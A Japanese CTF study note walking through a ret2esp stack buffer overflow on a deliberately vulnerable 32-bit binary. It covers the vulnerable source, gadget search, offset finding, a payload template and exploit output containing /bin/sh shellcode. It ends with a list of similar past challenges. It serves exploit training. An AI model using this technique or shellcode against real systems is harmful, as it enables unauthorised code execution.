## bof （DEP無効の場合の攻略法）

```
tmuxで端末(pane)を2つ開いて対応

e.g.
# tmux 
Ctrl-t + s で上下分割
Ctrl-t + v で左右分割
Ctrl-t + j で下側paneに移動
Ctrl-t + k で上側paneに移動

# su - guru

ソースコード確認

$ cat bof.c
/* bof.c */
#include <stdio.h>
#include <string.h>

void vuln() {
    char buf[100];
    memset(buf, '\0', sizeof(buf));
    read(0, buf, 0x400); // ★BoF!
}

int main(int argc, char *argv[])
{
    char cheat[] = "\xff\xe4\xff\xd4\x54\xc3"; // jmp esp...
    vuln();
    return 0;
}

ビルド

# make

初動調査

$ pwn.sh bof
bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=38d5b49577116e672ff718b2de4f9b18103adc95, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found★   NX disabled★   No PIE          No RPATH   No RUNPATH   69 Symbols     No       0               4       bof

NX disabledであることから、シェルコードを埋め込んで攻略する問題の可能性が高い★

jmp esp相当の命令があると、すぐ埋め込んだシェルコードに処理を移行できるので探す

+ jmp espに対応するバイト列(x86)
  8048098:       ff e4                   jmp    esp
  804809a:       ff d4                   call   esp
  804809c:       54                      push   esp
  804809d:       c3                      ret
  それぞれ対応するバイト列はff e4、ff d4、54 c3。

  利用できる場合、容易にstack上のshellcodeに制御を移すことができる
  gdbで該当するバイト列を探す方法
  (gdb) find/b 0x08048000,0x0804b000-1,0xff,0xe4
  (gdb) find/b 0x08048000,0x0804b000-1,0xff,0xd4
  (gdb) find/b 0x08048000,0x0804b000-1,0x54,0xc3

  e.g.
  スタックバッファオーバーフローを利用してリターンアドレスの値をjmp espの置かれたアドレスに書き換える。
  jmp espが実行されると、eipはリターンアドレスの一つ下のアドレスを指すことになるため、続けてシェルコードを置けばよい。
  buf = 'A' * bufsize
  buf += 'AAAA' * 3
  buf += struct.pack('<I', addr_jmpesp)
  buf += shellcode

rp-lin-x86/rp-lin-x64を使うと探すのが楽なのでrp-lin-x86/rp-lin-x64をよく使う

e.g.
$ rp-lin-x64 -r 2 -f bof --unique | grep 'jmp esp'
0x0804848e: inc ebp ; int1  ; jmp esp ;  (1 found)
0x0804848f: int1  ; jmp esp ;  (1 found)
0x08048490: jmp esp ;  (1 found)★みつかった

バッファの先頭からリターンアドレスまでのoffsetを確認

e.g.
$ gdb -q bof -ex 'pattc 150' -ex q | sed -e '1d' -e "s/'//g" > input
$ gdb -q bof -ex 'r <input' -ex q
Invalid $PC address: 0x41694141
$ gdb -q bof -ex 'patto 0x41694141' -ex q
1097417025 found at offset: 109★

exploit作成（exploitの雛形編集）

$ vi bof.pl
returnアドレスまでのoffsetを112に変更

サーバ側準備
$ socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./bof

exploit実行

$ perl bof.pl
[+] 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141419084040831c050682f2f7368682f62696e89e35089e25389e1b00bcd80
id
uid=1000(guru) gid=1000(guru) groups=1000(guru),27(sudo)
cat flag
FLAG_GGGGGGGGGGGGGGGGG

$ python bof.py 88
FLAG_GGGGGGGGGGGGGGGGG

＃call espやpush esp; retも仕込んでいますので、試してみてください
＃jmp esp/call esp/push esp;retを使う問題は、ときどき世界大会でも見かけます

```

## 過去事例

* DEFCON CTF Qualifier 2017 - smashme 436 x86-64 NX disabled、push rsp; ret利用可、rop 難度低
* She'll code it after school today. 250 x86, jmp esp, nanosleep 難度低
* ENCRYPT CTF 2019 - pwn2 100 x86, jmp esp 難度低
* CSA CTF 2019 - Something to do with snakes 500 x86, ret2esp応用問題, push esp ; mov ebx, dword [esp] ; ret 難度低
